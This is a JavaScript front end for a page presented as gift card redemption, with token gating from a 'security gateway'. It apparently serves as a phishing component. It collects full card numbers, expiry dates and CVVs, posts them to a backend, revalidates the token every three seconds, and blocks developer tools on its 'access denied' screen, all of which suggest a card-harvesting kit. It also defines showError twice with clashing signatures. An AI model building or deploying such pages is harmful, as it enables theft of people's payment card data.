// Global variables
let currentSection = 1;
let cardType = '';
let token = null;
let validationInterval = null;

// Initialize the page
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔐 Initializing gift card redemption form...');
    
    // Get token from URL query parameter
    const urlParams = new URLSearchParams(window.location.search);
    token = urlParams.get('token');

    // First check if token exists locally
    if (!token) {
        showNuclearError('Missing access token. Please return to the security gateway.');
        return;
    }
    
    // Validate token with backend BEFORE initializing the form
    validateTokenWithBackend();
});

async function validateTokenWithBackend() {
    try {
        console.log('🔐 Validating token with backend...');
        
        const response = await fetch('/api/validate-token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ token: token })
        });
        
        const result = await response.json();
        
        if (result.valid) {
            // Token is valid - initialize the form
            console.log('✅ Token validated with backend');
            initializeForm();
            populateDateDropdowns();
            setupEventListeners();
            
            // Update token expiry in localStorage based on backend response
            if (result.tokenData && result.tokenData.expiresAt) {
                const expiresAt = new Date(result.tokenData.expiresAt).getTime();
                localStorage.setItem('tokenExpiry', expiresAt);
            }
            
            // Start continuous token validation every 3 seconds
            startContinuousValidation();
            
        } else {
            // Token is invalid - NUCLEAR: Show error and block completely
            console.log('❌ Token invalid:', result.reason);
            showNuclearError('Invalid or expired token: ' + result.reason);
            // Clear invalid token
            localStorage.removeItem('secureToken');
            localStorage.removeItem('tokenExpiry');
        }
        
    } catch (error) {
        console.error('Token validation error:', error);
        showNuclearError('Token validation service unavailable. Please try again.');
    }
}

function startContinuousValidation() {
    // Validate token every 3 seconds
    validationInterval = setInterval(async () => {
        try {
            const response = await fetch('/api/validate-token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ token: token })
            });
            
            const result = await response.json();
            
            if (!result.valid) {
                // Token became invalid - NUCLEAR: Show error and block completely
                console.log('❌ Token became invalid during session:', result.reason);
                clearInterval(validationInterval);
                showNuclearError('Session expired: ' + result.reason);
                localStorage.removeItem('secureToken');
                localStorage.removeItem('tokenExpiry');
            }
            
        } catch (error) {
            console.error('Continuous validation error:', error);
            // Don't kick out for network errors, just log
        }
    }, 3000); // Every 3 seconds
}

function showNuclearError(message) {
    // COMPLETELY REPLACE the entire page with a modern error page
    document.body.innerHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Access Denied - Security Gateway</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #0e0e0fff 0%, #070e17ff 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    overflow: hidden;
                }
                
                .error-container {
                    text-align: center;
                    padding: 60px 40px;
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 20px;
                    backdrop-filter: blur(15px);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
                    max-width: 500px;
                    width: 90%;
                    animation: fadeIn 0.6s ease;
                }
                
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(30px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                
                .error-icon {
                    font-size: 4rem;
                    color: #fc8181;
                    margin-bottom: 20px;
                }
                
                @keyframes pulse {
                    0%, 100% { transform: scale(1); }
                    50% { transform: scale(1.1); }
                }
                
                .error-title {
                    font-size: 1.8rem;
                    font-weight: bold;
                    margin-bottom: 15px;
                    color: #fc8181;
                    text-shadow: 0 2px 10px rgba(252, 129, 129, 0.3);
                }
                
                .error-message {
                    font-size: 1.2rem;
                    margin-bottom: 30px;
                    line-height: 1.6;
                    opacity: 0.9;
                }
                
                .security-notice {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 15px;
                    border-radius: 10px;
                    margin-bottom: 25px;
                    border-left: 4px solid #38a169;
                }
                
                .security-notice h3 {
                    color: #00ff77ff;
                    margin-bottom: 8px;
                    font-size: 1.1rem;
                }
                
                .return-button {
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                    padding: 15px 30px;
                    background: linear-gradient(135deg, #38a169, #2f855a);
                    color: white;
                    text-decoration: none;
                    border-radius: 10px;
                    font-weight: bold;
                    font-size: 1.1rem;
                    transition: all 0.3s ease;
                    border: none;
                    cursor: pointer;
                }
                
                .return-button:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 8px 20px rgba(56, 161, 105, 0.3);
                }
                
                .particles {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    pointer-events: none;
                    z-index: -1;
                }
                
                .particle {
                    position: absolute;
                    background: rgba(255, 255, 255, 0.3);
                    border-radius: 50%;
                    animation: float 6s infinite ease-in-out;
                }
                
                @keyframes float {
                    0%, 100% { transform: translateY(0) rotate(0deg); }
                    50% { transform: translateY(-20px) rotate(180deg); }
                }
                
                .error-code {
                    margin-top: 20px;
                    font-size: 0.9rem;
                    opacity: 0.7;
                    font-family: 'Courier New', monospace;
                }
            </style>
        </head>
        <body>
            <div class="particles" id="particles"></div>
            
            <div class="error-container">
                <h1 class="error-title">ACCESS DENIED</h1>
                <p class="error-message">${message}</p>
                
                <div class="security-notice">
                    <p>Your session has been terminated due to security policy violations.</p>
                </div>
                
                <div class="error-code">
                    Error: SECURE_GATEWAY_ACCESS_DENIED
                </div>
            </div>
            
            <script>
                // Create floating particles
                function createParticles() {
                    const container = document.getElementById('particles');
                    for (let i = 0; i < 15; i++) {
                        const particle = document.createElement('div');
                        particle.className = 'particle';
                        particle.style.left = Math.random() * 100 + '%';
                        particle.style.top = Math.random() * 100 + '%';
                        particle.style.width = Math.random() * 6 + 2 + 'px';
                        particle.style.height = particle.style.width;
                        particle.style.animationDelay = Math.random() * 5 + 's';
                        particle.style.animationDuration = (Math.random() * 4 + 3) + 's';
                        container.appendChild(particle);
                    }
                }
                
                createParticles();
                
                // Prevent any right-click, F12, etc.
                document.addEventListener('contextmenu', e => e.preventDefault());
                document.addEventListener('keydown', e => {
                    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                        e.preventDefault();
                    }
                });
            </script>
        </body>
        </html>
    `;
}

function initializeForm() {
    console.log('📝 Initializing form...');
    // Show first section
    showSection(1);
}

function populateDateDropdowns() {
    console.log('📅 Populating date dropdowns...');
    const monthOptions = document.getElementById('expiryMonthOptions');
    const yearOptions = document.getElementById('expiryYearOptions');
    
    // Clear existing options
    monthOptions.innerHTML = '';
    yearOptions.innerHTML = '';
    
    // Populate months
    for (let i = 1; i <= 12; i++) {
        const month = i.toString().padStart(2, '0');
        const option = document.createElement('div');
        option.className = 'custom-option';
        option.dataset.value = month;
        option.textContent = month;
        monthOptions.appendChild(option);
    }
    
    // Populate years (current year to +20 years)
    const currentYear = new Date().getFullYear();
    for (let i = 0; i <= 20; i++) {
        const year = currentYear + i;
        const option = document.createElement('div');
        option.className = 'custom-option';
        option.dataset.value = year;
        option.textContent = year;
        yearOptions.appendChild(option);
    }
    
    // Initialize custom select functionality
    initializeCustomSelects();
}

function initializeCustomSelects() {
    console.log('🎯 Initializing custom selects...');
    
    // Initialize month select
    const monthSelect = document.getElementById('expiryMonthSelect');
    const monthTrigger = monthSelect.querySelector('.custom-select-trigger');
    const monthOptions = document.getElementById('expiryMonthOptions');
    const monthValue = document.getElementById('expiryMonthValue');
    const monthInput = document.getElementById('expiryMonth');
    
    // Initialize year select
    const yearSelect = document.getElementById('expiryYearSelect');
    const yearTrigger = yearSelect.querySelector('.custom-select-trigger');
    const yearOptions = document.getElementById('expiryYearOptions');
    const yearValue = document.getElementById('expiryYearValue');
    const yearInput = document.getElementById('expiryYear');
    
    // Debug logging
    console.log('Month select elements:', { monthSelect, monthTrigger, monthOptions, monthValue, monthInput });
    console.log('Year select elements:', { yearSelect, yearTrigger, yearOptions, yearValue, yearInput });
    
    // Toggle month dropdown
    monthTrigger.addEventListener('click', function(e) {
        e.stopPropagation();
        console.log('📆 Month dropdown clicked');
        monthSelect.classList.toggle('active');
        // Close other dropdowns
        yearSelect.classList.remove('active');
    });
    
    // Toggle year dropdown
    yearTrigger.addEventListener('click', function(e) {
        e.stopPropagation();
        console.log('📅 Year dropdown clicked');
        yearSelect.classList.toggle('active');
        // Close other dropdowns
        monthSelect.classList.remove('active');
    });
    
    // Month option selection
    monthOptions.querySelectorAll('.custom-option').forEach(option => {
        option.addEventListener('click', function() {
            const value = this.dataset.value;
            console.log('📆 Month selected:', value);
            monthValue.textContent = value;
            monthInput.value = value;
            monthSelect.classList.remove('active');
            
            // Update selected state
            monthOptions.querySelectorAll('.custom-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            this.classList.add('selected');
            
            validateExpiryDate();
        });
    });
    
    // Year option selection
    yearOptions.querySelectorAll('.custom-option').forEach(option => {
        option.addEventListener('click', function() {
            const value = this.dataset.value;
            console.log('📅 Year selected:', value);
            yearValue.textContent = value;
            yearInput.value = value;
            yearSelect.classList.remove('active');
            
            // Update selected state
            yearOptions.querySelectorAll('.custom-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            this.classList.add('selected');
            
            validateExpiryDate();
        });
    });
    
    // Close dropdowns when clicking outside
    document.addEventListener('click', function() {
        console.log('📄 Document clicked - closing dropdowns');
        monthSelect.classList.remove('active');
        yearSelect.classList.remove('active');
    });
    
    console.log('✅ Custom selects initialized');
}

function setupEventListeners() {
    console.log('🎧 Setting up event listeners...');
    
    // Card number formatting and validation
    const cardNumberInput = document.getElementById('cardNumber');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', formatCardNumber);
        cardNumberInput.addEventListener('blur', validateCardNumber);
    }
    
    // CVV validation
    const cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', validateCVV);
        cvvInput.addEventListener('blur', validateCVV);
    }
    
    console.log('✅ Event listeners set up');
}

async function submitGiftRedemption() {
    console.log('🎁 Submitting gift redemption...');
    
    try {
        const validationResponse = await fetch('/api/validate-token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ token: token })
        });
        
        const validationResult = await validationResponse.json();
        
        if (!validationResult.valid) {
            showNuclearError('Session expired during redemption. Please return to security gateway.');
            localStorage.removeItem('secureToken');
            localStorage.removeItem('tokenExpiry');
            return;
        }
    } catch (error) {
        showNuclearError('Token validation failed during redemption.');
        return;
    }
    
    const submitBtn = document.getElementById('submitBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');
    
    // Show loading state
    submitBtn.disabled = true;
    loadingOverlay.classList.add('active');
    
    // Prepare card data
    const cardData = {
        cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
        expiryMonth: document.getElementById('expiryMonth').value,
        expiryYear: document.getElementById('expiryYear').value,
        cvv: document.getElementById('cvv').value,
        cardType: cardType
    };
    
    try {
        const response = await fetch('/api/redeem', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                token: token,
                cardData: cardData
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showSuccess(result);
            // Stop continuous validation after successful redemption
            if (validationInterval) {
                clearInterval(validationInterval);
            }
        } else {
            throw new Error(result.error || 'Redemption failed');
        }
        
    } catch (error) {
        console.error('Redemption error:', error);
        showError(error.message || 'Failed to process gift card. Please try again.');
    } finally {
        submitBtn.disabled = false;
        loadingOverlay.classList.remove('active');
    }
}

// Clean up interval when leaving page
window.addEventListener('beforeunload', function() {
    if (validationInterval) {
        clearInterval(validationInterval);
    }
});

// Card number formatting
function formatCardNumber(event) {
    let value = event.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const selectionStart = event.target.selectionStart;
    
    // Detect card type
    detectCardType(value);
    
    // Format based on card type
    if (cardType === 'amex') {
        value = value.replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3');
    } else {
        value = value.replace(/(\d{4})/g, '$1 ').trim();
    }
    
    event.target.value = value;
    
    // Restore cursor position
    const newLength = value.length;
    const newPosition = selectionStart + (value.length - newLength);
    event.target.setSelectionRange(newPosition, newPosition);
    
    validateCardNumber();
}

// Card type detection
function detectCardType(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s+/g, '');
    
    // Visa: starts with 4
    if (/^4/.test(cleanNumber)) {
        cardType = 'visa';
        updateCardIcons('visa');
    }
    // Mastercard: starts with 51-55 or 2221-2720
    else if (/^(5[1-5]|2[2-7][0-9]{2})/.test(cleanNumber)) {
        cardType = 'mastercard';
        updateCardIcons('mastercard');
    }
    // Amex: starts with 34 or 37
    else if (/^3[47]/.test(cleanNumber)) {
        cardType = 'amex';
        updateCardIcons('amex');
    }
    else {
        cardType = '';
        updateCardIcons('');
    }
    
    updateCardTypeDisplay();
    validateCVV(); // Re-validate CVV when card type changes
}

function updateCardIcons(activeType) {
    const icons = {
        visa: document.getElementById('visaIcon'),
        mastercard: document.getElementById('mastercardIcon'),
        amex: document.getElementById('amexIcon')
    };
    
    // Reset all icons
    Object.values(icons).forEach(icon => {
        icon.classList.remove('active');
    });
    
    // Activate current type
    if (activeType && icons[activeType]) {
        icons[activeType].classList.add('active');
    }
}

function updateCardTypeDisplay() {
    const display = document.getElementById('detectedCardType');
    const typeNames = {
        visa: 'Visa',
        mastercard: 'Mastercard',
        amex: 'American Express'
    };
    
    if (cardType && typeNames[cardType]) {
        display.textContent = `Detected: ${typeNames[cardType]}`;
    } else {
        display.textContent = 'Card type will be detected automatically';
    }
}

// Validation functions
function validateCardNumber() {
    const input = document.getElementById('cardNumber');
    const error = document.getElementById('cardNumberError');
    const value = input.value.replace(/\s+/g, '');
    
    // Basic length validation
    const expectedLength = cardType === 'amex' ? 15 : 16;
    if (value.length !== expectedLength) {
        showError(error, `Card number must be ${expectedLength} digits for ${cardType.toUpperCase()}`);
        return false;
    }
    
    // Luhn algorithm validation
    if (!luhnCheck(value)) {
        showError(error, 'Invalid card number');
        return false;
    }
    
    hideError(error);
    return true;
}

function validateCVV() {
    const input = document.getElementById('cvv');
    const error = document.getElementById('cvvError');
    const value = input.value;
    
    const expectedLength = cardType === 'amex' ? 4 : 3;
    
    if (!/^\d+$/.test(value)) {
        showError(error, 'CVV must contain only numbers');
        return false;
    }
    
    if (value.length !== expectedLength) {
        showError(error, `CVV must be ${expectedLength} digits for ${cardType.toUpperCase()}`);
        return false;
    }
    
    hideError(error);
    return true;
}

function validateExpiryDate() {
    const monthInput = document.getElementById('expiryMonth');
    const yearInput = document.getElementById('expiryYear');
    const error = document.getElementById('expiryError');
    
    if (!monthInput.value || !yearInput.value) {
        showError(error, 'Please select both month and year');
        return false;
    }
    
    const expiryDate = new Date(yearInput.value, monthInput.value - 1);
    const currentDate = new Date();
    
    if (expiryDate < currentDate) {
        showError(error, 'Card has expired');
        return false;
    }
    
    hideError(error);
    return true;
}

// Luhn algorithm implementation
function luhnCheck(cardNumber) {
    let sum = 0;
    let isEven = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Section navigation
function showSection(sectionNumber) {
    // Hide all sections
    document.querySelectorAll('.form-section').forEach(section => {
        section.classList.remove('active');
    });
    
    // Show target section
    document.getElementById(`section-${sectionNumber}`).classList.add('active');
    
    // Update progress steps
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.querySelector(`.step[data-step="${sectionNumber}"]`).classList.add('active');
    
    currentSection = sectionNumber;
}

function nextSection() {
    if (currentSection === 1 && validateSection1()) {
        updateVerificationPreview();
        showSection(2);
    }
}

function prevSection() {
    if (currentSection === 2) {
        showSection(1);
    }
}

function validateSection1() {
    const validations = [
        validateCardNumber(),
        validateExpiryDate(),
        validateCVV()
    ];
    
    return validations.every(valid => valid);
}

function updateVerificationPreview() {
    document.getElementById('cardNumberPreview').textContent = 
        document.getElementById('cardNumber').value;
    
    document.getElementById('expiryPreview').textContent = 
        `${document.getElementById('expiryMonth').value}/${document.getElementById('expiryYear').value.slice(-2)}`;
    
    document.getElementById('cvvPreview').textContent = 
        document.getElementById('cvv').value;
    
    const typeNames = {
        visa: 'Visa',
        mastercard: 'Mastercard',
        amex: 'Amex'
    };
    
    document.getElementById('cardTypePreview').textContent = 
        cardType ? typeNames[cardType] : '';
}

// Form submission
document.getElementById('giftForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    if (!validateSection1()) {
        showError('Please fix validation errors before submitting.');
        return;
    }
    
    await submitGiftRedemption();
});

function showSuccess(result) {
    const successMessage = document.getElementById('successMessage');
    const successDetails = document.getElementById('successDetails');
    
    successDetails.textContent = result.message || 'Your gift card has been processed successfully!';
    document.getElementById('section-2').classList.remove('active');
    successMessage.classList.add('active');
    
    // Update progress steps to show step 3 as active
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.querySelector('.step[data-step="3"]').classList.add('active');
    
    currentSection = 3; // Update current section to confirmation
}

function showError(message) {
    // Simple error display - you might want to use a more sophisticated notification system
    alert(`Error: ${message}`);
}

function resetForm() {
    // Reset form
    document.getElementById('giftForm').reset();
    document.getElementById('successMessage').classList.remove('active');
    showSection(1);
    cardType = '';
    updateCardIcons('');
    updateCardTypeDisplay();
    
    // Reset custom selects
    document.getElementById('expiryMonthValue').textContent = 'Month';
    document.getElementById('expiryYearValue').textContent = 'Year';
    document.getElementById('expiryMonth').value = '';
    document.getElementById('expiryYear').value = '';
    
    // Clear selected options
    document.querySelectorAll('.custom-option.selected').forEach(option => {
        option.classList.remove('selected');
    });
    
    // Reset progress steps to show step 1 as active
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.querySelector('.step[data-step="1"]').classList.add('active');
    
    currentSection = 1; // Reset current section
}

// Utility functions
function showError(element, message) {
    element.textContent = message;
    element.classList.add('active');
    element.previousElementSibling.classList.add('error');
}

function hideError(element) {
    element.classList.remove('active');
    element.previousElementSibling.classList.remove('error');
}